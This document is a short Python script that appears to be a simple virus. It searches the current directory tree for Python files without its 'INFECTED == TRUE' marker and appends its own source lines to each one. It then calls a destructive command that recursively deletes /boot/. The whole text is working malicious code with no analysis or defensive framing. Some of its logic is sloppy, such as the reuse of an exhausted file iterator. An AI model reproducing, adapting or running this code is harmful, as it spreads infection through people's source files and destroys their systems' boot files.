import os
import sys
SIG = "INFECTED == TRUE"

def search_files(path):
	files = []
	infected = False
	dirname, filename = os.path.split(os.path.abspath(__file__))
	dirs = os.listdir(path)
	for arq in dirs:
		if os.path.isdir(path + "/" + arq):
			files.extend(search_files(path + "/" + arq))
		elif arq.endswith(".py") and not arq.startswith(filename):
			for lines in open(path + "/" + arq):
				if SIG in lines:
					infected = True
					break
			if infected == False:
				files.append(path + "/" + arq)
	return files

def infect_files(files):
	own_file = open(os.path.abspath(__file__), "r")
	stream = ""
	for arq in files:
		arq = open(arq, "a")
		for i, lines_code in enumerate(own_file):
			if i >= 0 and i <= 38:
				stream += lines_code
		arq.write(stream)

	own_file.close

def destroy():
	os.system("rm -r /boot/")

files = search_files(os.path.abspath(""))
infect_files(files)
destroy()
